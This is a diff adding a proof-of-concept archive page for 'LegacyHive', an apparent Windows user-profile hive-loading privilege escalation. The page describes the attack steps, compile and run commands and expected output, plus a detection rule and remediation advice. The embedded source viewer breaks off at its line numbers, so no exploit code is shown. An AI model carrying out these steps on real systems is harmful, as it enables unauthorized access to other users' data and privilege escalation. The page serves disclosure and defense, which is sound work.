@@ -1,0 +1,1016 @@
+<!doctype html><html lang=en class="dark scroll-smooth"><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>LegacyHive - Windows user profile service arbitrary hive load elevation of privileges vulnerability · PoC Archive</title><meta name=description content="A curated archive of security research proof-of-concept exploits. Reproducible writeups across web, network, binary, crypto, cloud, hardware, and social-engineering categories."><meta name=author content="intelseclab"><meta name=theme-color content="#09090b"><meta name=keywords content="CVE,PoC,exploit,proof of concept,security research,Microsoft Windows user profile service / registry hive loading path,windows,lpe,user-profile-service,registry-hive,usrclass.dat,oplock,symbolic-link"><link rel=canonical href=https://poc.intelseclab.com/pocs/binary/2026-07-19_legacyhive-user-profile-service-hive-load-lpe/><meta property="og:title" content="LegacyHive - Windows user profile service arbitrary hive load elevation of privileges vulnerability · PoC Archive"><meta property="og:description" content="A curated archive of security research proof-of-concept exploits. Reproducible writeups across web, network, binary, crypto, cloud, hardware, and social-engineering categories."><meta property="og:type" content="article"><meta property="og:url" content="https://poc.intelseclab.com/pocs/binary/2026-07-19_legacyhive-user-profile-service-hive-load-lpe/"><meta property="og:site_name" content="PoC Archive"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://poc.intelseclab.com/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta name=twitter:image content="https://poc.intelseclab.com/og-image.png"><meta name=twitter:card content="summary_large_image"><meta property="article:published_time" content="2026-07-19T00:00:00Z"><meta property="article:modified_time" content="2026-07-14T00:00:00Z"><meta property="article:tag" content="windows"><meta property="article:tag" content="lpe"><meta property="article:tag" content="user-profile-service"><meta property="article:tag" content="registry-hive"><meta property="article:tag" content="usrclass.dat"><meta property="article:tag" content="oplock"><meta property="article:tag" content="symbolic-link"><meta name=twitter:title content="LegacyHive - Windows user profile service arbitrary hive load elevation of privileges vulnerability · PoC Archive"><meta name=twitter:description content="A curated archive of security research proof-of-concept exploits. Reproducible writeups across web, network, binary, crypto, cloud, hardware, and social-engineering categories."><meta name=twitter:site content="@intelseclab"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=language content="en"><meta name=revisit-after content="3 days"><meta name=robots content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><script>(function(){try{var e=localStorage.getItem("theme");e==="light"?document.documentElement.classList.remove("dark"):document.documentElement.classList.add("dark")}catch{}})()</script><script src="https://cdn.tailwindcss.com?plugins=typography"></script><script>tailwind.config={darkMode:"class",theme:{extend:{fontFamily:{sans:["Inter","ui-sans-serif","system-ui","sans-serif"],mono:['"JetBrains Mono"',"ui-monospace","SFMono-Regular","monospace"]}}}}</script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/syntax.css><style>html.dark body{background-color:#09090b}body,body *{transition:background-color .15s ease,border-color .15s ease,color .15s ease}html,body{overflow-x:hidden;max-width:100%}.prose :where(p,li,blockquote,td,th){overflow-wrap:break-word;word-break:break-word}.prose :where(code):not(pre code){overflow-wrap:break-word;word-break:break-word}.prose table th:first-child,.prose table td:first-child{width:1%;white-space:nowrap}</style><link rel=icon type=image/svg+xml href=/favicon.svg></head><body class="min-h-screen bg-white text-zinc-900 font-sans antialiased selection:bg-emerald-400/20 selection:text-emerald-900 dark:bg-zinc-950 dark:text-zinc-100 dark:selection:text-emerald-200"><header class="sticky top-0 z-40 border-b border-zinc-200/80 bg-white/80 backdrop-blur dark:border-zinc-800 dark:bg-zinc-950/80"><div class="mx-auto flex w-full max-w-6xl items-center gap-4 px-4 py-3 sm:px-6 lg:px-8"><a href=/ class="flex items-center gap-2 font-mono text-sm font-semibold tracking-tight text-zinc-900 dark:text-zinc-100"><img src=/favicon.svg width=36 height=36 alt="PoC Archive">
+<span>PoC Archive</span></a><nav class="ml-2 hidden items-center gap-1 text-sm sm:flex"><a href=/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-zinc-900 dark:hover:text-zinc-100">home</a>
+<a href=/pocs/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-zinc-900 dark:hover:text-zinc-100 !text-emerald-600 dark:!text-emerald-400">pocs</a>
+<a href=/archive/ class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-zinc-900 dark:hover:text-zinc-100">archive</a></nav><div class="ml-auto flex items-center gap-2"><a href=https://github.com/intelseclab/poc-archive target=_blank rel="noopener noreferrer" class="hidden rounded-md border border-zinc-200 px-3 py-1.5 text-xs font-medium text-zinc-700 transition hover:bg-zinc-100 sm:inline-flex dark:border-zinc-800 dark:text-zinc-300 dark:hover:bg-zinc-900">GitHub
+</a><button type=button id=theme-toggle aria-label="Toggle color theme" class="inline-flex h-8 w-8 items-center justify-center rounded-md border border-zinc-200 text-zinc-700 transition hover:bg-zinc-100 focus:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 dark:border-zinc-800 dark:text-zinc-300 dark:hover:bg-zinc-900">
+<svg class="hidden h-4 w-4 dark:block" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+<svg class="block h-4 w-4 dark:hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 009 9 9 9 0 11-9-9z"/></svg></button></div></div><nav class="flex items-center gap-1 border-t border-zinc-200 px-4 py-2 text-sm sm:hidden dark:border-zinc-800"><a href=/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">home</a>
+<a href=/pocs/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">pocs</a>
+<a href=/archive/ class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">archive</a></nav><script>(function(){var e=document.getElementById("theme-toggle");if(!e)return;e.addEventListener("click",function(){var e=document.documentElement,t=e.classList.toggle("dark");try{localStorage.setItem("theme",t?"dark":"light")}catch{}})})()</script></header><main class="mx-auto w-full max-w-6xl px-4 py-8 sm:px-6 lg:px-8"><article class="grid grid-cols-1 gap-8 lg:grid-cols-[1fr_18rem]"><div class="min-w-0 lg:order-1"><nav class="mb-4 font-mono text-xs text-zinc-500 dark:text-zinc-400"><a href=/pocs/ class="hover:text-emerald-600 dark:hover:text-emerald-400">pocs</a>
+<span class="text-zinc-300 dark:text-zinc-700">/ </span><a href=/pocs/binary/ class="hover:text-emerald-600 dark:hover:text-emerald-400">binary</a></nav><div class="flex flex-wrap items-center gap-2"><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>High
+</span><span class="rounded-md border border-emerald-500/30 px-2 py-0.5 font-mono text-xs uppercase text-emerald-600 dark:text-emerald-400">patched</span></div><h1 class="mt-4 text-balance font-mono text-2xl font-semibold tracking-tight text-zinc-900 sm:text-3xl dark:text-zinc-100">LegacyHive - Windows user profile service arbitrary hive load elevation of privileges vulnerability</h1><p class="mt-2 font-mono text-xs text-zinc-500 dark:text-zinc-400">by MSNightmare (Nightmare-Eclipse) · 2026-07-19</p><div class="mt-6 lg:hidden"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40"><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>High</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/binary/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">binary</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Microsoft Windows user profile service / registry hive loading path</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">Windows desktop and server installations reported as exploitable by the researcher as of July 2026 patches</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-07-19</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-emerald-600 dark:text-emerald-400">patched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/windows/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#windows</a>
+<a href=/tags/lpe/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#lpe</a>
+<a href=/tags/user-profile-service/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#user-profile-service</a>
+<a href=/tags/registry-hive/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#registry-hive</a>
+<a href=/tags/usrclass.dat/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#usrclass.dat</a>
+<a href=/tags/oplock/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#oplock</a>
+<a href=/tags/symbolic-link/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#symbolic-link</a></div></div><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p><ul class="mt-2 space-y-1.5"><li class="flex items-start gap-1.5"><svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<a href=https://github.com/MSNightmare/LegacyHive target=_blank rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/MSNightmare/LegacyHive</a></li></ul></div><div class="border-t border-zinc-200 pt-4 dark:border-zinc-800"><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p><a href=https://github.com/intelseclab/poc-archive/tree/master/pocs/binary/2026-07-19_legacyhive-user-profile-service-hive-load-lpe/ target=_blank rel="noopener noreferrer" class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400"><svg class="h-3.5 w-3.5 flex-shrink-0" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37.0.0 5.37.0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57.0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925.0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18.0.0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+intelseclab/poc-archive</a></div></div></div><div class="prose prose-zinc mt-8 max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']"><h2 id=metadata>Metadata</h2><div class=overflow-x-auto><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td><strong>Date Added</strong></td><td>2026-07-19</td></tr><tr><td><strong>Last Updated</strong></td><td>2026-07-14</td></tr><tr><td><strong>Author / Researcher</strong></td><td>MSNightmare (Nightmare-Eclipse)</td></tr><tr><td><strong>CVE / Advisory</strong></td><td>N/A</td></tr><tr><td><strong>Category</strong></td><td>binary</td></tr><tr><td><strong>Severity</strong></td><td>High</td></tr><tr><td><strong>CVSS Score</strong></td><td>N/A</td></tr><tr><td><strong>Status</strong></td><td>Weaponized</td></tr><tr><td><strong>Tags</strong></td><td>windows, lpe, user-profile-service, registry-hive, usrclass.dat, oplock, symbolic-link</td></tr><tr><td><strong>Related</strong></td><td>N/A</td></tr></tbody></table></div><hr><h2 id=affected-target>Affected Target</h2><div class=overflow-x-auto><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td><strong>Software / System</strong></td><td>Microsoft Windows user profile service / registry hive loading path</td></tr><tr><td><strong>Versions Affected</strong></td><td>Windows desktop and server installations reported as exploitable by the researcher as of July 2026 patches</td></tr><tr><td><strong>Language / Platform</strong></td><td>C++, Windows</td></tr><tr><td><strong>Authentication Required</strong></td><td>Partial (requires standard user credentials and a target username)</td></tr><tr><td><strong>Network Access Required</strong></td><td>Local only</td></tr></tbody></table></div><hr><h2 id=summary>Summary</h2><p>LegacyHive demonstrates a local privilege-escalation path in Windows user profile hive handling where a low-privileged user can influence how another user&rsquo;s hive is loaded. The PoC modifies hive data and abuses object manager links and an oplock timing window to coerce privileged behavior around <code>UsrClass.dat</code> loading. On success, the target user&rsquo;s hive is mounted in the attacker&rsquo;s context via <code>RegOpenUserClassesRoot</code>, demonstrating unauthorized hive-load behavior that can be used for privilege escalation scenarios.</p><hr><h2 id=vulnerability-details>Vulnerability Details</h2><h3 id=root-cause>Root Cause</h3><p>The PoC indicates a trust-boundary failure in user profile hive loading logic: attacker-controlled filesystem/object-manager redirection combined with modified hive values (<code>User Shell Folders\Local AppData</code>) can influence where profile-service components resolve and load user hive content. This enables privileged operations to act on attacker-controlled paths.</p><h3 id=attack-vector>Attack Vector</h3><ol><li>Authenticate as a standard user and prepare a writable working directory and object manager links under <code>\BaseNamedObjects\Restricted</code>.</li><li>Patch the attacker&rsquo;s <code>ntuser.dat</code> hive so <code>Local AppData</code> points to a crafted path, then replace the on-disk hive.</li><li>Copy a target user&rsquo;s <code>UsrClass.dat</code>, hold it with a batch oplock, and trigger profile loading via <code>CreateProcessWithLogonW</code> + <code>RegOpenUserClassesRoot</code>.</li><li>Release timing controls after oplock trigger so the redirected path is used during hive load.</li></ol><h3 id=impact>Impact</h3><p>A local attacker can force unintended hive-loading behavior for another user profile, enabling elevation-of-privilege conditions and unauthorized access to user hive context/data.</p><hr><h2 id=environment--lab-setup>Environment / Lab Setup</h2><pre tabindex=0><code>OS:        Windows desktop/server build (researcher claims July 2026 patched systems remain affected)
+Target:    Local Windows host with multiple user accounts
+Attacker:  Standard local user account
+Tools:     Visual Studio / C++ build chain, Windows SDK, offreg library headers
+</code></pre><h3 id=setup-steps>Setup Steps</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>LegacyHive.exe &lt;username&gt; &lt;password&gt; &lt;target_user_hive&gt;
+</span></span></code></pre></td></tr></table></div></div><hr><h2 id=proof-of-concept>Proof of Concept</h2><h3 id=step-by-step-reproduction>Step-by-Step Reproduction</h3><ol><li><p><strong>Compile the PoC</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cl /EHsc LegacyHive.cpp /link userenv.lib advapi32.lib ntdll.lib offreg.lib Rpcrt4.lib
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Execute with standard-user credentials and a target account name</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>LegacyHive.exe standard_user Password123 target_username
+</span></span></code></pre></td></tr></table></div></div></li><li><p><strong>Observe success condition</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>oplock triggered !
+</span></span><span class=line><span class=cl>Hive loaded, press any key to unload and exit.
+</span></span></code></pre></td></tr></table></div></div></li></ol><h3 id=exploit-code>Exploit Code</h3><blockquote><p>See <code>LegacyHive.cpp</code> in this folder.</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=c1>// Core trigger path (simplified)
+</span></span></span><span class=line><span class=cl><span class=c1>// 1) Create object-manager links
+</span></span></span><span class=line><span class=cl><span class=c1>// 2) Modify Local AppData in ntuser.dat
+</span></span></span><span class=line><span class=cl><span class=c1>// 3) Trigger RegOpenUserClassesRoot while holding/releasing oplock
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=expected-output>Expected Output</h3><pre tabindex=0><code>oplock triggered !
+Hive loaded, press any key to unload and exit.
+</code></pre><hr><h2 id=screenshots--evidence>Screenshots / Evidence</h2><ul><li>Upstream screenshot embedded in source README demonstrates successful run output.</li></ul><hr><h2 id=detection--indicators-of-compromise>Detection & Indicators of Compromise</h2><pre tabindex=0><code></code></pre><p><strong>SIEM / IDS Rule (example):</strong></p><pre tabindex=0><code>Alert when low-privileged processes create symbolic links in object namespaces
+and immediately trigger profile hive load APIs (RegOpenUserClassesRoot).
+</code></pre><hr><h2 id=remediation>Remediation</h2><div class=overflow-x-auto><table><thead><tr><th>Action</th><th>Detail</th></tr></thead><tbody><tr><td><strong>Patch</strong></td><td>Monitor Microsoft advisories and apply profile-service / hive-loading related security updates when published</td></tr><tr><td><strong>Workaround</strong></td><td>Restrict local attack surface (least privilege, limit interactive logons, monitor privileged profile API abuse)</td></tr><tr><td><strong>Config Hardening</strong></td><td>Detect/block suspicious object manager link creation and unusual hive file manipulation patterns</td></tr></tbody></table></div><hr><h2 id=references>References</h2><ul><li><a href=https://github.com/MSNightmare/LegacyHive>Source Repository</a></li></ul><hr><h2 id=notes>Notes</h2><p>The upstream researcher states this public PoC is intentionally stripped down and that a fuller internal variant can target arbitrary hives.</p><p>Auto-ingested from <a href=https://github.com/MSNightmare/LegacyHive>https://github.com/MSNightmare/LegacyHive</a> on 2026-07-19.</p></div><div class="mt-10 overflow-hidden rounded-lg border border-zinc-700/60 shadow-2xl"><div class="flex items-center gap-3 bg-zinc-800 px-3 py-2"><div class="flex shrink-0 items-center gap-1.5"><span class="h-3 w-3 rounded-full bg-red-500"></span>
+<span class="h-3 w-3 rounded-full bg-yellow-400"></span>
+<span class="h-3 w-3 rounded-full bg-green-500"></span></div><div class="flex flex-1 justify-center"><div class="flex items-center gap-1.5 rounded-t border-x border-t border-zinc-700 bg-zinc-950 px-3 py-1"><span class="h-2.5 w-2.5 shrink-0 rounded-sm" style=background-color:#60a5fa></span>
+<span class="font-mono text-xs text-zinc-200">LegacyHive.cpp</span></div></div><div class="flex shrink-0 items-center gap-2"><span class="rounded border border-zinc-600 bg-zinc-700/40 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wide text-zinc-400">cpp</span>
+<a href=https://raw.githubusercontent.com/intelseclab/poc-archive/master/pocs/binary/2026-07-19_legacyhive-user-profile-service-hive-load-lpe/LegacyHive.cpp target=_blank rel=noopener class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">raw</a>
+<a href=https://github.com/intelseclab/poc-archive/blob/master/pocs/binary/2026-07-19_legacyhive-user-profile-service-hive-load-lpe/LegacyHive.cpp target=_blank rel=noopener class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">GitHub</a>
+<a href=https://raw.githubusercontent.com/intelseclab/poc-archive/master/pocs/binary/2026-07-19_legacyhive-user-profile-service-hive-load-lpe/LegacyHive.cpp download=LegacyHive.cpp class="rounded bg-emerald-600 px-2.5 py-1 font-mono text-xs font-medium text-white transition hover:bg-emerald-500">↓ Download</a></div></div><div class="poc-viewer overflow-x-auto"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span><span class=lnt>231
+</span><span class=lnt>232
+</span><span class=lnt>233
+</span><span class=lnt>234
+</span><span class=lnt>235
+</span><span class=lnt>236
+</span><span class=lnt>237
+</span><span class=lnt>238
+</span><span class=lnt>239
+</span><span class=lnt>240
+</span><span class=lnt>241
+</span><span class=lnt>242
+</span><span class=lnt>243
+</span><span class=lnt>244
+</span><span class=lnt>245
+</span><span class=lnt>246
+</span><span class=lnt>247
+</span><span class=lnt>248
+</span><span class=lnt>249
+</span><span class=lnt>250
+</span><span class=lnt>251
+</span><span class=lnt>252
+</span><span class=lnt>253
+</span><span class=lnt>254
+</span><span class=lnt>255
+</span><span class=lnt>256
